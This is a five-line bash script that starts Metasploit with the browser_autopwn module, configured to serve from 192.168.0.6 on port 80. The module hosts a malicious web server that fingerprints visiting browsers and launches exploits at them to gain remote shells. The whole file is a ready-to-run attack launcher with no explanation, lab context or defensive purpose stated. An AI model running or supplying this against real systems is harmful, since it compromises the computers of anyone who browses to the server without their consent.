#!/bin/bash
msfconsole -x "use auxiliary/server/browser_autopwn;
set LHOST 192.168.0.6;
set SRVHOST 192.168.0.6;
set SRVPORT 80;
run;"

